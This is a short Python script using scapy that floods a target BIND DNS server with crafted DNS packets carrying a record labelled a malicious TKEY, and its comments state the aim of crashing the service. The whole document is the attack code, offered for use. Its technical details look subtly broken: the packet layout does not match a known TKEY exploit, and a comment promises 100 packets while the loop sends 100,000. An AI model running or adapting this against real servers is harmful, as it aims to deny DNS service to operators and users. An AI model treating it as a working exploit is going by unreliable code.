from scapy.all import *

# Target BIND DNS server
target_ip = "192.168.1.103"  # Replace with the IP address of the vulnerable server

# Function to send a single malicious DNS TKEY query
def send_malicious_tkey_query():
    dns_tkey_query = IP(dst=target_ip)/UDP(dport=53)/DNS(
        id=1234,  # Transaction ID
        qr=0,  # This is a query
        opcode=5,  # Opcode for Dynamic Update
        rd=1,  # Recursion Desired
        qd=DNSQR(qname="example.com"),  # Standard query for example.com
        ns=DNSRR(rrname="example.com", type="TKEY", ttl=0, rdata="maliciousdata")  # Malicious TKEY record
    )
    send(dns_tkey_query, verbose=0)  # Send without verbose for speed

# Send multiple DNS queries to ensure the service crashes
for i in range(100000):  # Sends 100 packets (adjust the number as needed)
    send_malicious_tkey_query()
    print(f"Sent malicious TKEY query {i+1}")
